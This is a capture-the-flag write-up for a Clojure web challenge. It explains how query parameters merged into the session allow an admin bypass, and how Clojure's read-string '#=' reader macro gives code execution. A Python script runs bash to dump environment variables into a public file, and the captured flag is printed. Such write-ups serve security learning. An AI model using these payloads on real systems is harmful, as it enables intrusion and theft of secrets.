# 0xl4ugh CTF

## manifesto

> This is an easy challenge, except... it's written in Clojure. Can you find your way through all of these parentheses and come out victorious? - @aelmo

## Approach

Noting the code `(assoc :session (merge {"prefer" "light"} session query-params))`, this means `query-params` will be merged into `session`, potentially allowing permission checks to be bypassed via a URL like `/?username=admin`.

The next step is the exploitation of the `read-string` function. The `read-string` function can be used to execute arbitrary code, you can try the payload `#=(* 7 7)` and you will see the result `49`. However, when i attempt `(clojure.java.shell/sh "...")`, it always shows `Something went wrong...`. So after some googling, I find the payload in [this writeup](https://b.poc.fun/faust-ctf-doedel-writeup/) works. My final solution is as follows:

```python
import requests

with requests.session() as s:
    url = "https://a5f6bcb2307b2e9bcf64ffd9a382f720.chal.ctf.ae"
    s.get(url + "/?username=admin&redirect=/gists")
    s.post(url + "/gists", data={
        # "gist": '#=(* 7 7)'
        "gist": '#=(eval\
            (.\
                (java.lang.Runtime/getRuntime)\
                exec\
                (into-array ["bash" "-c" "export > ./resources/public/static/1.txt"])\
            )\
        )',
    })
    resp = s.get(url + "/static/1.txt")
    print(resp.text)
```

This can be used to execute arbitrary code. But for this challenge, we only need to read the environment variable `FLAG`. The official writeup uses payload `#=(java.lang.System/getenv "FLAG")`, which is more concise.

## Flag

```
flag{jwHvR1Lv50TzsftMH8Bv9cJN7Jg6jbIC}
```
